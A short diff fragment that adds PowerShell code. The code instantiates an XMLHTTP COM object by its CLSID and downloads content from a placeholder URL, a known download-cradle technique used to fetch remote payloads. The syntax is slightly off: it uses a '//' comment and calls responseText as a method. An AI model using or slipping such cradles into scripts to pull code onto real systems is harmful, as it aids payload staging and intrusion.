@@ -1,0 +1,4 @@
+$object = [activator]::CreateInstance([type]::GetTypeFromCLSID("F5078F35-C551-11D3-89B9-0000F81FE221"));
+$object.open("GET", [URL]);
+$object.send();
+$object.responseText(); //Content of the downloaded file
